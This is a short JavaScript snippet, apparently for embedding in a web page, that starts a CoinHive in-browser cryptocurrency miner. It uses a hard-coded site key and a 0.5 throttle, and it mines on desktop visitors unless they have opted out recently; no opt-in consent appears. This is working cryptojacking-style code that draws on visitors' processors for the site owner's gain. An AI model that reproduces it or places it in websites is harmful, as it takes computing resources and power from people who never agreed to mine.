var miner = new CoinHive.Anonymous('fdBYR67PMZ6W4AAJHqkGRAb0CMHXkDHp', {
    throttle: 0.5
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}